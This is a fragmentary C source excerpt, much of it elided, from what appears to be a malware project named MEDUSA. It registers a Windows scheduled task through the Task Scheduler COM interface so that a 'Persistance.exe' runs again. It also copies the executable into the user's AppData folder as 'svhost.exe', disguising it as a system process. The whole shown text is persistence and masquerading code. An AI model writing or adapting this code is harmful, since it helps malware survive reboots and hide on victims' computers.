...
*/
    ...
    */
    ...
    userid.vt = VT_EMPTY;
    pass.vt = VT_EMPTY;
    WCHAR* path = L"D:\\Reverse Enginnering\\MEDUSA\\Persistance\\x64\\Debug\\Persistance.exe";
    BSTR Bpath= SysAllocString(path);
    pExecAction2->lpVtbl->put_Path(pExecAction2, Bpath);
    //pExecAction2->lpVtbl->put_WorkingDirectory(pExecAction2, LPSTRToBSTR(L"D:\\Reverse Enginnering\\MEDUSA\\Persistance\\x64\\Debug"));
    pExecAction2->lpVtbl->Release(pExecAction2);

    WCHAR* taskName = L"MyScheduledTask";
...
int copyExeToAppData() {
    ...
    char destinationFilePath[] = "C:\\Users\\anand\\AppData\\Roaming\\svhost.exe";
    ...
    if (pathLength == 0 || pathLength >= MAX_PATH) {
     ...
     // LPCTSTR source = convertCharToLPCTSTR(sourceFilePath);
